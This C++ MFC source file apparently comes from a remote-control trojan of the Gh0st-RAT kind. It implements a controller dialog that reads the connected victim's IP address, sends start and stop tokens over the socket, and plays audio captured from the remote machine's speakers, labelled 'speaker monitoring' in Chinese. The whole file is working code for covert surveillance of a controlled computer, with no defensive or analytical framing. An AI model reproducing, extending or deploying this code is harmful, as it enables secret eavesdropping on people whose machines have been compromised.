﻿// CSpeakerDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CSpeakerDlg.h"
#include "afxdialogex.h"


// CSpeakerDlg 对话框

IMPLEMENT_DYNAMIC(CSpeakerDlg, CDialog)

CSpeakerDlg::CSpeakerDlg(CWnd* pParent, CIOCPServer* IOCPServer, ClientContext* ContextObject)
	: CDialog(IDD_SPEAKER, pParent)
{
	m_bIsWorking = TRUE;
	m_bThreadRun = FALSE;
	m_iocpServer = IOCPServer;       //为类的成员变量赋值
	m_ContextObject = ContextObject;
	m_hWorkThread = NULL;
	m_nTotalRecvBytes = 0;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));        //得到被控端ip
	int iClientAddressLen = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->m_Socket, (SOCKADDR*)&ClientAddress, &iClientAddressLen);
	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";

}

CSpeakerDlg::~CSpeakerDlg()
{
	m_bIsWorking = FALSE;
	while (m_bThreadRun)
		Sleep(50);
}

void CSpeakerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_BUTTON1, m_startL);
	DDX_Control(pDX, IDC_BUTTON3, m_stopL);
}


BEGIN_MESSAGE_MAP(CSpeakerDlg, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CSpeakerDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON3, &CSpeakerDlg::OnBnClickedButton3)
END_MESSAGE_MAP()


// CSpeakerDlg 消息处理程序


void CSpeakerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}

	CoUninitialize();
	CancelIo((HANDLE)m_ContextObject->m_Socket);
	closesocket(m_ContextObject->m_Socket);

	m_bIsWorking = FALSE;
	//WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
}


BOOL CSpeakerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString strString;
	strString.Format("%s - 扬声器监听", m_strIPAddress);
	SetWindowText(strString);

	//启动线程 判断CheckBox
	//m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	m_bThreadRun = m_hWorkThread ? TRUE : FALSE;
	m_stopL.EnableWindow(0);

	return TRUE;  // return TRUE unless you set the focus to a control

}

void CSpeakerDlg::OnReceiveComplete(void)
{
	
	m_nTotalRecvBytes += m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, strString);
	switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SPEAK_DATA:
	{
		SetSpeakerDate.PlayBuffer(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1), m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1);   //播放波形数据
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}
}




void CSpeakerDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = TOKEN_SPEAK_START;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
	CoInitialize(NULL);
	SetSpeakerDate.Initialize();
	SetSpeakerDate.Start();
	m_startL.EnableWindow(0);
	m_stopL.EnableWindow(1);
}


void CSpeakerDlg::OnBnClickedButton3()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = TOKEN_SPEAK_STOP;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	CoUninitialize();
	m_startL.EnableWindow(1);
	m_stopL.EnableWindow(0);
}
